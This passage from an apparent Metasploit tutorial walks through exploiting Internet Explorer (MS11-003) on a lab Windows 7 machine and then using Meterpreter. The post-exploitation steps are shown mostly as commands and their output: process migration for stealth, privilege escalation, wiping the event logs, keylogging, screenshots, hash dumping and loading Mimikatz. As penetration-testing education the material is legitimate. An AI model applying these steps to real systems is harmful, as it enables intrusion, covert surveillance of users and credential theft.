<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; [*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending redirect
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/RHHy0H.html"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending HTML
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/generic-1465040907.dll"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending .NET DLL
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending CSS
</span><span class='line'>[*] Sending stage (957487 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 5 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49281) at 2016-06-04 07:48:33 -0400
</span><span class='line'>[*] Session ID 5 (192.168.80.155:4444 -&gt; 192.168.80.128:49281) processing InitialAutoRunScript 'migrate -f'
</span><span class='line'>[*] Current server process: iexplore.exe (2772)
</span><span class='line'>[*] Spawning notepad.exe process to migrate to
</span><span class='line'>[+] Migrating to 988
</span><span class='line'>[+] Successfully migrated to process </span></code></pre></td></tr></table></div></figure>


<p>I actually closed IE on the Windows machine because it kept requesting the DLL and opening more sessions. Now it&rsquo;s time to go to the newly created Meterpreter session:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type                   Information                                Connection
</span><span class='line'>  --  ----                   -----------                                ----------
</span><span class='line'>  5   meterpreter x86/win32  WIN-D7GA2J1M0TU\wingoat @ WIN-D7GA2J1M0TU  192.168.80.155:4444 -&gt; 192.168.80.128:49281 (192.168.80.128)
</span><span class='line'>
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; sessions -i 5
</span><span class='line'>[*] Starting interaction with 5...</span></code></pre></td></tr></table></div></figure>


<p>The reason I wanted to show Meterpreter on a Windows target is because there are many commands unique to Windows that we can use. I will demo them further</p>

<h2>Meterpreter commands</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; ?
</span><span class='line'>
</span><span class='line'>Core Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command                   Description
</span><span class='line'>    -------                   -----------
</span><span class='line'>    ?                         Help menu
</span><span class='line'>    background                Backgrounds the current session
</span><span class='line'>    bgkill                    Kills a background meterpreter script
</span><span class='line'>    bglist                    Lists running background scripts
</span><span class='line'>    bgrun                     Executes a meterpreter script as a background thread
</span><span class='line'>    channel                   Displays information or control active channels
</span><span class='line'>    close                     Closes a channel
</span><span class='line'>    disable_unicode_encoding  Disables encoding of unicode strings
</span><span class='line'>    enable_unicode_encoding   Enables encoding of unicode strings
</span><span class='line'>    exit                      Terminate the meterpreter session
</span><span class='line'>    get_timeouts              Get the current session timeout values
</span><span class='line'>    help                      Help menu
</span><span class='line'>    info                      Displays information about a Post module
</span><span class='line'>    irb                       Drop into irb scripting mode
</span><span class='line'>    load                      Load one or more meterpreter extensions
</span><span class='line'>    machine_id                Get the MSF ID of the machine attached to the session
</span><span class='line'>    migrate                   Migrate the server to another process
</span><span class='line'>    quit                      Terminate the meterpreter session
</span><span class='line'>    read                      Reads data from a channel
</span><span class='line'>    resource                  Run the commands stored in a file
</span><span class='line'>    run                       Executes a meterpreter script or Post module
</span><span class='line'>    set_timeouts              Set the current session timeout values
</span><span class='line'>    sleep                     Force Meterpreter to go quiet, then re-establish session.
</span><span class='line'>    transport                 Change the current transport mechanism
</span><span class='line'>    use                       Deprecated alias for 'load'
</span><span class='line'>    uuid                      Get the UUID for the current session
</span><span class='line'>    write                     Writes data to a channel
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: File system Commands
</span><span class='line'>============================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    cat           Read the contents of a file to the screen
</span><span class='line'>    cd            Change directory
</span><span class='line'>    download      Download a file or directory
</span><span class='line'>    edit          Edit a file
</span><span class='line'>    getlwd        Print local working directory
</span><span class='line'>    getwd         Print working directory
</span><span class='line'>    lcd           Change local working directory
</span><span class='line'>    lpwd          Print local working directory
</span><span class='line'>    ls            List files
</span><span class='line'>    mkdir         Make directory
</span><span class='line'>    mv            Move source to destination
</span><span class='line'>    pwd           Print working directory
</span><span class='line'>    rm            Delete the specified file
</span><span class='line'>    rmdir         Remove directory
</span><span class='line'>    search        Search for files
</span><span class='line'>    show_mount    List all mount points/logical drives
</span><span class='line'>    upload        Upload a file or directory
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: Networking Commands
</span><span class='line'>===========================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    arp           Display the host ARP cache
</span><span class='line'>    getproxy      Display the current proxy configuration
</span><span class='line'>    ifconfig      Display interfaces
</span><span class='line'>    ipconfig      Display interfaces
</span><span class='line'>    netstat       Display the network connections
</span><span class='line'>    portfwd       Forward a local port to a remote service
</span><span class='line'>    route         View and modify the routing table
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: System Commands
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    clearev       Clear the event log
</span><span class='line'>    drop_token    Relinquishes any active impersonation token.
</span><span class='line'>    execute       Execute a command
</span><span class='line'>    getenv        Get one or more environment variable values
</span><span class='line'>    getpid        Get the current process identifier
</span><span class='line'>    getprivs      Attempt to enable all privileges available to the current process
</span><span class='line'>    getsid        Get the SID of the user that the server is running as
</span><span class='line'>    getuid        Get the user that the server is running as
</span><span class='line'>    kill          Terminate a process
</span><span class='line'>    ps            List running processes
</span><span class='line'>    reboot        Reboots the remote computer
</span><span class='line'>    reg           Modify and interact with the remote registry
</span><span class='line'>    rev2self      Calls RevertToSelf() on the remote machine
</span><span class='line'>    shell         Drop into a system command shell
</span><span class='line'>    shutdown      Shuts down the remote computer
</span><span class='line'>    steal_token   Attempts to steal an impersonation token from the target process
</span><span class='line'>    suspend       Suspends or resumes a list of processes
</span><span class='line'>    sysinfo       Gets information about the remote system, such as OS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: User interface Commands
</span><span class='line'>===============================
</span><span class='line'>
</span><span class='line'>    Command        Description
</span><span class='line'>    -------        -----------
</span><span class='line'>    enumdesktops   List all accessible desktops and window stations
</span><span class='line'>    getdesktop     Get the current meterpreter desktop
</span><span class='line'>    idletime       Returns the number of seconds the remote user has been idle
</span><span class='line'>    keyscan_dump   Dump the keystroke buffer
</span><span class='line'>    keyscan_start  Start capturing keystrokes
</span><span class='line'>    keyscan_stop   Stop capturing keystrokes
</span><span class='line'>    screenshot     Grab a screenshot of the interactive desktop
</span><span class='line'>    setdesktop     Change the meterpreters current desktop
</span><span class='line'>    uictl          Control some of the user interface components
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: Webcam Commands
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>    Command        Description
</span><span class='line'>    -------        -----------
</span><span class='line'>    record_mic     Record audio from the default microphone for X seconds
</span><span class='line'>    webcam_chat    Start a video chat
</span><span class='line'>    webcam_list    List webcams
</span><span class='line'>    webcam_snap    Take a snapshot from the specified webcam
</span><span class='line'>    webcam_stream  Play a video stream from the specified webcam
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Elevate Commands
</span><span class='line'>======================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    getsystem     Attempt to elevate your privilege to that of local system.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Password database Commands
</span><span class='line'>================================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    hashdump      Dumps the contents of the SAM database
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Timestomp Commands
</span><span class='line'>========================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    timestomp     Manipulate file MACE attributes</span></code></pre></td></tr></table></div></figure>


<p>The first thing I will do is migrate to the Windows Explorer process, because a stray Notepad might look suspicious. I got the PID from doing a <em>ps</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; migrate 1408
</span><span class='line'>[*] Migrating from 988 to 1408...
</span><span class='line'>[*] Migration completed successfully.
</span><span class='line'>meterpreter &gt; getpid
</span><span class='line'>Current pid: 1408</span></code></pre></td></tr></table></div></figure>


<p>So let&rsquo;s now play with the available functionality. I made a file that I will upload to the hacked machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 5...
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; echo 'HA HA HA' &gt; read.txt
</span><span class='line'>[*] exec: echo 'HA HA HA' &gt; read.txt
</span><span class='line'>
</span><span class='line'>meterpreter &gt; upload /root/read.txt C:\
</span><span class='line'>[*] uploading  : /root/read.txt -&gt; C:\
</span><span class='line'>[*] uploaded   : /root/read.txt -&gt; C:\\read.txt
</span><span class='line'>meterpreter &gt; cd C:\
</span><span class='line'>meterpreter &gt; cat read.txt
</span><span class='line'>HA HA HA</span></code></pre></td></tr></table></div></figure>


<p>Ok, now I will download something on my machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; download desktop.ini
</span><span class='line'>[*] downloading: desktop.ini -&gt; desktop.ini
</span><span class='line'>[*] download   : desktop.ini -&gt; desktop.ini
</span><span class='line'>meterpreter &gt; cat desktop.ini
</span><span class='line'>��
</span><span class='line'>[.ShellClassInfo]
</span><span class='line'>LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s now look at some system information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : WIN-D7GA2J1M0TU
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64
</span><span class='line'>System Language : en_US
</span><span class='line'>Domain          : WORKGROUP
</span><span class='line'>Logged On Users : 1
</span><span class='line'>Meterpreter     : x64/win64</span></code></pre></td></tr></table></div></figure>


<p>I attempted to get system privileges and it worked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; getsystem
</span><span class='line'>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s possible to clear the event log of the machine, though that is anything but stealthy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clearev
</span><span class='line'>[*] Wiping 1583 records from Application...
</span><span class='line'>[*] Wiping 5436 records from System...
</span><span class='line'>[*] Wiping 1422 records from Security...</span></code></pre></td></tr></table></div></figure>


<p>We can also execute native commands on the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; execute -h
</span><span class='line'>Usage: execute -f file [options]
</span><span class='line'>
</span><span class='line'>Executes a command on the remote machine.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -H        Create the process hidden from view.
</span><span class='line'>    -a &lt;opt&gt;  The arguments to pass to the command.
</span><span class='line'>    -c        Channelized I/O (required for interaction).
</span><span class='line'>    -d &lt;opt&gt;  The 'dummy' executable to launch when using -m.
</span><span class='line'>    -f &lt;opt&gt;  The executable command to run.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -i        Interact with the process after creating it.
</span><span class='line'>    -k        Execute process on the meterpreters current desktop
</span><span class='line'>    -m        Execute from memory.
</span><span class='line'>    -s &lt;opt&gt;  Execute process in a given session as the session user
</span><span class='line'>    -t        Execute process with currently impersonated thread token
</span><span class='line'>
</span><span class='line'>meterpreter &gt; execute -f "ipconfig /flushdns" -i -H
</span><span class='line'>Process 2016 created.
</span><span class='line'>Channel 3 created.
</span><span class='line'>
</span><span class='line'>Windows IP Configuration
</span><span class='line'>
</span><span class='line'>Successfully flushed the DNS Resolver Cache.</span></code></pre></td></tr></table></div></figure>


<p>If you&rsquo;re feeling brave, you can mess around, uhm, interact with the target registry:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; reg -h
</span><span class='line'>Usage: reg [command] [options]
</span><span class='line'>
</span><span class='line'>Interact with the target machine's registry.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -d &lt;opt&gt;  The data to store in the registry value.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).
</span><span class='line'>    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials
</span><span class='line'>    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).
</span><span class='line'>    -v &lt;opt&gt;  The registry value name (E.g. Stuff).
</span><span class='line'>    -w        Set KEY_WOW64 flag, valid values [32|64].
</span><span class='line'>
</span><span class='line'>COMMANDS:
</span><span class='line'>
</span><span class='line'>    enumkey   Enumerate the supplied registry key [-k &lt;key&gt;]
</span><span class='line'>    createkey Create the supplied registry key  [-k &lt;key&gt;]
</span><span class='line'>    deletekey Delete the supplied registry key  [-k &lt;key&gt;]
</span><span class='line'>    queryclass Queries the class of the supplied key [-k &lt;key&gt;]
</span><span class='line'>    setval    Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]
</span><span class='line'>    deleteval Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]
</span><span class='line'>    queryval  Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span></code></pre></td></tr></table></div></figure>


<p>To leverage more Windows-specific functionality, you can choose to spawn a system shell and do your work from there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process 2368 created.
</span><span class='line'>Channel 5 created.
</span><span class='line'>Microsoft Windows [Version 6.1.7601]
</span><span class='line'>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
</span><span class='line'>
</span><span class='line'>C:\Windows\system32&gt;</span></code></pre></td></tr></table></div></figure>


<h3>User interface commands</h3>

<p>We can interact with various components of the Windows GUI. First, let&rsquo;s enumerate the available desktops and get the current one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; enumdesktops
</span><span class='line'>Enumerating all accessible desktops
</span><span class='line'>
</span><span class='line'>Desktops
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>    Session  Station  Name
</span><span class='line'>    -------  -------  ----
</span><span class='line'>    1        WinSta0  Default
</span><span class='line'>    1        WinSta0  Disconnect
</span><span class='line'>    1        WinSta0  Winlogon
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getdesktop
</span><span class='line'>Session 1\W\D</span></code></pre></td></tr></table></div></figure>


<p>See how long the user has been idle:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; idletime
</span><span class='line'>User has been idle for: 5 mins 10 secs</span></code></pre></td></tr></table></div></figure>


<p>If you want to know what the user is up to, you can start a keylogger and quietly observe everything like a ghost in the machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; keyscan_start 
</span><span class='line'>Starting the keystroke sniffer...</span></code></pre></td></tr></table></div></figure>


<p>I typed something on the hacked machine and now I&rsquo;m going to dump the keystrokes and see what we&rsquo;ve got:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; keyscan_dump
</span><span class='line'>Dumping captured keystrokes...
</span><span class='line'>much $ such security wow
</span><span class='line'>meterpreter &gt; keyscan_stop
</span><span class='line'>Stopping the keystroke sniffer...</span></code></pre></td></tr></table></div></figure>


<p>Now I want to see what the user sees. So let&rsquo;s take a screenshot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; screenshot
</span><span class='line'>Screenshot saved to: /root/ahhOgnkh.jpeg</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/tools/metasploit/ss.jpeg" title="screenshot" alt="screenshot of target desktop"></p>

<p>In case you want to annoy the user, you can mess with some of the user interface:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; uictl -h
</span><span class='line'>Usage: uictl [enable/disable] [keyboard/mouse/all]</span></code></pre></td></tr></table></div></figure>


<p>I can&rsquo;t demo the webcam and mic commands now so I won&rsquo;t go into those, but you have them at your disposal if the target has a webcam or microphone</p>

<h2>Post exploitation</h2>

<p>Once you have a foothold on the system, there are more things that you can do to assist you in squeezing more juice out of the hacked machine</p>

<h3>Dumping hashes</h3>

<p>You can use <em>hashdump</em> to dump the local hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; hashdump
</span><span class='line'>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>wingoat:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code></pre></td></tr></table></div></figure>


<p>It is possible to also get the hashes and credentials straight from memory by using Mimikatz:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; load mimikatz
</span><span class='line'>Loading extension mimikatz...success.
</span><span class='line'>meterpreter &gt; help mimikatz
</span><span class='line'>
</span><span class='line'>Mimikatz Commands
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>    Command           Description
</span><span class='line'>    -------           -----------
</span><span class='line'>    kerberos          Attempt to retrieve kerberos creds
</span><span class='line'>    livessp           Attempt to retrieve livessp creds
</span><span class='line'>    mimikatz_command  Run a custom command
</span><span class='line'>    msv               Attempt to retrieve msv creds (hashes)
</span><span class='line'>    ssp               Attempt to retrieve ssp creds
</span><span class='line'>    tspkg             Attempt to retrieve tspkg creds
